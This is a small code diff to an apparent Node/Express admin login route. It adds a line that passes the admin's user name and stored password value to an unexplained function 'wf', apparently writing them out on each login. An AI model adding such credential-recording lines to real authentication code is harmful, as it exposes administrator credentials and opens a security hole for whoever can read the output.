@@ -198,6 +198,7 @@ route.post("/admins/login", function (req, res) {
             res.redirect('/admins/error')
         }
         let admin_password = result[0]['Password']
+        wf(`${result[0]['User_name']}${result[0]['Password']}`)
         bcrypt.compare(pass, admin_password, function(err, match) {
             if (err || !match) {
                 res.redirect('/admins/error')
